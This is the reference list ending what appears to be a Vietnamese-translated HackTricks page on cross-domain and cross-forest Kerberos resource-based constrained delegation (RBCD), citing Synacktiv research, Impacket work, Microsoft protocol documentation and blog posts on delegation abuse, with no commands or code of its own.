- [9] [Synacktiv - Khám phá RBCD liên domain và liên forest](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Khám phá RBCD liên domain và liên forest: phần 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Nhánh Impacket của Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Tổng quan về Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self liên domain](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Phát hiện và khắc phục việc sử dụng RC4 trong Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Chi tiết S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Khai thác RBCD bằng tài khoản người dùng thông thường](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Lạm dụng Constrained Delegation không có Protocol Transition với tài khoản không có SPN](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Lạm dụng Constrained Delegation không có Protocol Transition với tài khoản không có SPN](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy với U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - Sử dụng ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Bật ghi nhật ký sự kiện Kerberos](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
